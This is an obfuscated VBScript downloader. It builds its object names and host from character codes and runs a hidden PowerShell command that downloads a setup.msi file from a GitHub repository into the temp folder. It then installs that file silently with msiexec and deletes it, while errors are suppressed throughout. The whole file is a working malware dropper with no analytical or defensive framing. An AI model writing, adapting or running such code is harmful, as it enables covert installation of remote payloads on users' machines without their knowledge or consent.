'#@~^FQAAAA==@#@&JbAAA==^#~@
On Error Resume Next
Function C(n):C=Chr(n):End Function
Dim W,F,D,T,P
Set W=CreateObject("W"&C(83)&C(99)&C(114)&C(105)&C(112)&C(116)&C(46)&C(83)&C(104)&C(101)&C(108)&C(108))
Set F=CreateObject("S"&C(99)&C(114)&C(105)&C(112)&C(116)&C(105)&C(110)&C(103)&C(46)&C(70)&C(105)&C(108)&C(101)&C(83)&C(121)&C(115)&C(116)&C(101)&C(109)&C(79)&C(98)&C(106)&C(101)&C(99)&C(116))
D=C(103)&C(105)&C(116)&C(104)&C(117)&C(98)&C(46)&C(99)&C(111)&C(109)
T=W.ExpandEnvironmentStrings("%"&C(84)&C(69)&C(77)&C(80)&C(37))&C(92)&F.GetTempName()&C(46)&C(109)&C(115)&C(105)
P="powershell -nop -c ""$c=New-Object Net.WebClient;$u='ht'+'tps://'+'"+D+"'+'/lordcrowleyco-alt/new/raw/refs/heads/main/setup.msi';$c.DownloadFile($u,'"+T+"')"""
W.Run P,0,1
If F.FileExists(T) Then W.Run "msiexec /i """&T&""" /qn /norestart",0,1:F.DeleteFile T